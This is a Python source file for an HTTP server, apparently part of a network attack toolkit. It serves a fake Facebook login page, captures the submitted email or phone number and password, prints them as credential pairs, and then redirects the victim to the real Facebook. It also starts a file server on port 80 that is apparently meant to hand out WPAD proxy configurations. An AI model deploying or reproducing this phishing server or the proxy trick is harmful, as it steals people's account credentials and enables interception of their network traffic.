import threading
from functools import cached_property
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from http.cookies import SimpleCookie
from urllib.parse import parse_qsl, urlparse, parse_qs

import json

from networking_functions import get_local_ip
from utils import thread_with_trace

from colorama import init, Fore

from scapy.all import conf

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET


class WebRequestHandler(BaseHTTPRequestHandler):
    @cached_property
    def url(self):
        return urlparse(self.path)

    @cached_property
    def query_data(self):
        return dict(parse_qsl(self.url.query))

    @cached_property
    def post_data(self):
        content_length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(content_length)

    @cached_property
    def form_data(self):
        return dict(parse_qsl(self.post_data.decode("utf-8")))

    @cached_property
    def cookies(self):
        return SimpleCookie(self.headers.get("Cookie"))

    def do_GET(self):
        if self.path == '/':
            self.path = '/facebook-login.html'
        elif self.path == '/test':
            self.path = '/test.html'
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 - Not Found')

        try:
            file_to_open = open('assets/web_server_files/' + self.path[1:], encoding="utf-8").read()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes(file_to_open, 'utf-8'))
        except Exception as e:
            print(e)
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 - Not Found')

    def do_POST(self):
        if self.path != "/login" and self.path != "/login/":
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 - Not Found')
            return

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        form_data = parse_qs(post_data.decode('utf-8'))

        username_or_phone_number = str(form_data["email"][0])
        password = str(form_data["pass"][0])
        print(username_or_phone_number + ":" + password)
        self.send_response(302)
        self.send_header('Location', 'https://facebook.com')
        self.end_headers()
        print("[+] Redirected to facebook")

    def get_response(self):
        return json.dump(
            {
                "path": self.url.path,
                "query_data": self.query_data,
                "post_data": self.post_data.decode("utf-8"),
                "form_data": self.form_data,
                "cookies": {
                    name: cookie.value
                    for name, cookie in self.cookies.items()
                }
            }
        )


def http_server_start(printing_queue, verbosity):
    printing_queue.put(f"\n{GREEN}[+] HTTP server started{RESET}")
    server_instance = HTTPServer(('', 80), WebRequestHandler)
    server_instance.serve_forever()


def http_wpad_giver_server_start(interface, printing_queue, verbosity, cancel_token):
    http_port = 80
    # local_ip = get_local_ip()
    if verbosity > 0:
        printing_queue.put(f"{GREEN}[+] Starting wpad giver server{RESET}")
    httpd = HTTPServer(('0.0.0.0', http_port), SimpleHTTPRequestHandler)
    httpd.serve_forever()



def start_http_server_thread(interface, printing_queue, verbosity):
    # http_server_thread = thread_with_trace(target=http_server_start, args=(printing_queue, verbosity))
    cancel_token = threading.Event()
    http_server_thread = thread_with_trace(target=http_wpad_giver_server_start, args=(interface, printing_queue, verbosity, cancel_token))
    http_server_thread.start()
    return cancel_token

# if __name__ == "__main__":
#     http_server_start()
